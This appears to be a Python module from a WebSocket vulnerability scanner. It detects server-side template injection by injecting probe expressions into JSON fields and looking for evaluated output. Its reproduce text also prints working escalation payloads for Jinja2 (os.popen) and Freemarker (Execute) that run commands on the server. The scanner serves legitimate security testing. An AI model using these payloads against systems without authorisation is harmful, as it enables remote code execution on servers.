"""
Server-Side Template Injection via WebSocket
Detects Jinja2, Twig, Freemarker, Pebble, Velocity, Mako.
SSTI → Remote Code Execution in many cases.
"""
import asyncio
import json
import re
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


# ── SSTI Probe Payloads ───────────────────────────────────────────────────────
# Math expression that templates evaluate: 7*7 = 49
SSTI_PROBES = [
    # Jinja2 / Twig (Python/PHP)
    ('{{7*7}}',                '49',              'Jinja2/Twig'),
    ('{{7*\'7\'}}',            '7777777',         'Jinja2 string multiply'),
    ('{%- if 1==1 -%}YES{%- endif -%}', 'YES',   'Jinja2 if block'),
    ('{{config}}',             'Config',           'Jinja2 config object'),

    # Freemarker (Java)
    ('${7*7}',                 '49',              'Freemarker'),
    ('<#if 1==1>YES</#if>',    'YES',             'Freemarker if'),

    # Pebble (Java)
    ('{{7*7}}',                '49',              'Pebble'),

    # Velocity (Java)
    ('#set($x=7*7)${x}',       '49',              'Velocity'),
    ('${7*7}',                 '49',              'Velocity/EL'),

    # Mako (Python)
    ('${7*7}',                 '49',              'Mako/Python EL'),

    # Smarty (PHP)
    ('{7*7}',                  '49',              'Smarty'),
    ('{{7*7}}',                '49',              'Smarty v3'),

    # ERB (Ruby)
    ('<%= 7*7 %>',             '49',              'ERB/Ruby'),

    # Tornado (Python)
    ('{{7*7}}',                '49',              'Tornado'),

    # Expression Language (Java Spring)
    ('#{7*7}',                 '49',              'EL/Spring'),
    ('*{7*7}',                 '49',              'Spring SpEL'),
    ('${7*7}',                 '49',              'Spring EL'),

    # Handlebars (JavaScript)
    ('{{#with "s" as |string|}}{{string}}{{/with}}', 's', 'Handlebars'),

    # Nunjucks (JavaScript)
    ('{{7*7}}',                '49',              'Nunjucks'),
]

# Fields to inject SSTI payload
SSTI_FIELDS = [
    'message', 'text', 'content', 'name', 'title',
    'template', 'body', 'subject', 'greeting',
    'comment', 'description', 'label', 'value',
    'username', 'email', 'query', 'search',
]

# Patterns that confirm SSTI
SSTI_CONFIRMED = [
    r'\b49\b',           # 7*7 = 49
    r'\bYES\b',          # if block rendered
    r'Config',           # Jinja2 config object
    r'7777777',          # 7*'7' in Jinja2
]


async def test_ssti(ws_url: str, fast_mode: bool = False) -> bool:
    """
    SSTI Test:
    Inject template expressions like {{7*7}}.
    If response contains 49 = template engine executed our code.
    Different payloads detect different template engines.
    """
    found_any = False
    probes = SSTI_PROBES[:8] if fast_mode else SSTI_PROBES
    fields = SSTI_FIELDS[:5] if fast_mode else SSTI_FIELDS

    try:
        async with await ws_connect(ws_url, timeout=6) as ws:
            # Get baseline first
            baseline = await send_recv(ws, '{"type":"ping","value":"hello"}', timeout=2)
            baseline_str = str(baseline or '')

            # If baseline already contains 49 = false positive risk
            if '49' in baseline_str:
                log.debug(f"SSTI: baseline contains '49', adjusting detection")

            for payload, expected, engine_name in probes:
                for field in fields:
                    try:
                        msg = json.dumps({field: payload})
                        resp = await send_recv(ws, msg, timeout=3)
                        if not resp:
                            continue

                        # Check if template was evaluated
                        is_confirmed = False
                        for pattern in SSTI_CONFIRMED:
                            if re.search(pattern, resp):
                                # Make sure this wasn't in baseline
                                if not re.search(pattern, baseline_str):
                                    is_confirmed = True
                                    break

                        if is_confirmed:
                            # Determine severity
                            # Jinja2/Freemarker/ERB → can lead to RCE
                            is_rce_capable = any(e in engine_name for e in [
                                'Jinja2', 'Freemarker', 'ERB', 'Mako', 'Velocity'
                            ])

                            ev = Evidence.make(
                                payload=payload,
                                request=msg,
                                response=resp[:300],
                                proof=(
                                    f"SSTI confirmed: payload '{payload}' was evaluated by {engine_name} engine.\n"
                                    f"Expected output '{expected}' found in response.\n"
                                    f"Template injection = potential Remote Code Execution."
                                ),
                                reproduce=(
                                    f"1. Connect to {ws_url}\n"
                                    f"2. Send: {msg}\n"
                                    f"3. Response contains '{expected}' — template executed\n"
                                    f"4. Engine: {engine_name}\n"
                                    f"5. Escalate to RCE: "
                                    + ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
                                       if 'Jinja2' in engine_name else
                                       "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
                                       if 'Freemarker' in engine_name else
                                       "Use engine-specific RCE payload")
                                ),
                                engine=engine_name,
                                field=field,
                            )

                            store.add(
                                ws_url,
                                f'Server-Side Template Injection ({engine_name})',
                                'CRITICAL',
                                f"SSTI confirmed in field '{field}' using {engine_name} syntax.\n"
                                f"Payload: {payload}\n"
                                f"Template engine evaluated attacker input.\n"
                                f"{'Can escalate to Remote Code Execution.' if is_rce_capable else 'May be exploitable further.'}",
                                ev
                            )
                            found_any = True
                            log.warning(f"CRITICAL: SSTI ({engine_name}) on {ws_url} field '{field}'")
                            return found_any  # Stop on first confirmed

                    except asyncio.TimeoutError:
                        continue
                    except Exception:
                        continue

    except Exception as e:
        log.debug(f"SSTI test error on {ws_url}: {e}")

    return found_any
